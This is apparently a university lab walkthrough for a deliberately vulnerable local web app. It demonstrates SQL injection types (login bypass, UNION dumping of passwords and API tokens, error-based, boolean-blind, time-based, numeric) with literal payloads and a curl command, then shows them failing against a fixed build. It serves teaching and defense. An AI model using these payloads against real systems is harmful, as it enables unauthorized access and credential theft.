# SQL Injection Attack Guide — WEB404 Practical 5

A step-by-step manual walkthrough of every injection type demonstrated in this lab.
Run these against the **vulnerable build** at `http://127.0.0.1:3000`, then repeat them
against the **secure build** at `http://127.0.0.1:3001` to see the fix.

> All testing is against `127.0.0.1` (your own machine). This is the authorised,
> self-contained lab required by the assignment — never run these payloads against a
> system you do not own.

---

## Injection point map

| Route | Vulnerable query (simplified) | Context | Types demonstrated |
|-------|-------------------------------|---------|--------------------|
| `POST /login` | `... WHERE username='<u>' AND password='<p>'` | string | auth bypass, error-based |
| `GET /products?category=` | `SELECT id,name,price ... WHERE category='<c>'` | string, 3 cols | UNION, boolean-blind, time-based, error-based |
| `GET /profile?id=` | `SELECT id,username,role,email ... WHERE id=<id>` | numeric, 4 cols | numeric, UNION |

---

## 1. Authentication bypass (in-band)

The login query is `SELECT ... WHERE username='<u>' AND password='<p>'`.
Comment out the password check by injecting a SQL comment (`--`).

**In the browser** go to `/login` and submit:

- Username: `admin' -- ` *(note the trailing space after `--`; SQLite needs it)*
- Password: *(anything)*

The query becomes:

```sql
SELECT ... FROM users WHERE username='admin' -- ' AND password='...'
```

Everything after `--` is a comment, so the password is never checked → logged in as **admin**.

Alternative "always true" payload in **both** fields: `' OR '1'='1`

**curl:**
```bash
curl -s -X POST http://127.0.0.1:3000/login \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=x"
```

---

## 2. UNION-based data exfiltration (in-band)

`/products` selects **3 columns** (`id, name, price`). A `UNION SELECT` with the same
column count appends attacker-chosen rows to the result set.

**Determine column count** (order-by probing):
```
peripherals' ORDER BY 3 --      (works)
peripherals' ORDER BY 4 --      (error: only 3 columns -> confirms 3)
```

**Dump all credentials** — put `username:password` in column 2, the API token in column 3:
```
peripherals' UNION SELECT id, username || ':' || password, api_token FROM users -- 
```
URL:
```
http://127.0.0.1:3000/products?category=peripherals'%20UNION%20SELECT%20id,%20username%20||%20':'%20||%20password,%20api_token%20FROM%20users%20--%20
```

**Enumerate the schema** (SQLite metadata table):
```
peripherals' UNION SELECT id, name, sql FROM sqlite_master WHERE type='table' -- 
```

---

## 3. Error-based information disclosure

The vulnerable app prints raw database errors. A single unbalanced quote breaks the
syntax and the backend tells you what happened:

```
http://127.0.0.1:3000/products?category=peripherals'
```
→ `unrecognized token: "'peripherals''"` — this confirms (a) the input is injectable
and (b) the backend is SQLite. Leaking error text is itself a vulnerability
(module 2.4 Information Disclosure) and a powerful aid when building blind payloads.

---

## 4. Boolean-based blind injection

Used when results/errors are **not** shown but the page behaves differently for
true vs false. Here the number of product rows is the oracle:

```
peripherals' AND 1=1 --      -> 3 rows  (TRUE)
peripherals' AND 1=2 --      -> 0 rows  (FALSE)
```

Extract the admin password one character at a time by asking true/false questions:
```
peripherals' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='S' --   -> 3 rows => char 1 is 'S'
peripherals' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='X' --   -> 0 rows => not 'X'
```
Iterate position 1,2,3… and the alphabet to recover the full secret. (In practice a
tool like **sqlmap** automates exactly this loop.)

---

## 5. Time-based blind injection

Used when the response is identical whether the condition is true or false — you infer
the answer from **how long** the server takes to reply. This lab registers a `sleep()`
SQL function (real engines: MySQL `SLEEP()`, PostgreSQL `pg_sleep()`, MSSQL `WAITFOR DELAY`).

```
peripherals' AND sleep(3) --
```
Baseline response ≈ 0.001 s; the injected one takes several seconds → injection confirmed.
Make it conditional to exfiltrate data blind:
```
peripherals' AND CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='S' THEN sleep(3) ELSE 0 END --
```
*(Note: `sleep()` is evaluated once per candidate row, so the delay is roughly
`matched_rows × seconds`.)*

---

## 6. Numeric injection (no quotes needed)

`/profile?id=` drops the value into a numeric context: `... WHERE id = <id>`. No quote to
break out of — just append SQL:

```
http://127.0.0.1:3000/profile?id=0 OR 1=1          -> dumps every user
http://127.0.0.1:3000/profile?id=1 UNION SELECT name, value, 'x', 'y' FROM app_secrets
```
The second payload matches the 4 selected columns and exfiltrates the secrets table,
revealing the flag `WEB404{sql_injection_union_select_success}`.

---

## Replaying against the secure build (`:3001`)

Every payload above, sent to port **3001**, fails:

- **Parameterized queries** — input is bound as data, so `admin' --` is searched for as a
  literal username and matches nobody; `UNION`/`OR 1=1` become part of the string value.
- **Input validation / allow-listing** — `/products` rejects any category outside the known
  set; `/profile` rejects any id that is not a positive integer *before* a query runs.
- **Generic error messages** — no SQL or backend details leak, killing error-based recon.

This side-by-side (same payload, two outcomes) is the core evidence for the assignment.
